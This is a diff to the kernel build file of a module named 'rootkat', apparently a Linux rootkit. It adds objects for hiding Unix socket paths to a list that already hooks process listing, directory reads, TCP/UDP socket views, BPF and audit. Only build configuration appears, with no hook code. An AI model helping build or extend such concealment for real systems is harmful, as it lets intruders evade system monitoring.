@@ -5,12 +5,12 @@ endif
 
 obj-m += rootkat.o
 rootkat-y := main.o kallsyms.o resolver.o ftrace_hook.o \
-             hidden_pids.o hidden_ports.o \
+             hidden_pids.o hidden_ports.o hidden_unix_paths.o \
              hook_m_show.o hook_sys_kill.o hook_filldir64.o \
              hook_tcp4_seq_show.o hook_tcp6_seq_show.o \
              hook_udp_seq_show.o \
              hook_inet_sk_diag_fill.o hook_sys_bpf.o \
-             hook_audit.o
+             hook_audit.o hook_unix_seq_show.o
 
 # Inside the build container, $(uname -r) returns the host kernel which has
 # no headers tree. Resolve KDIR from the headers package layout instead.
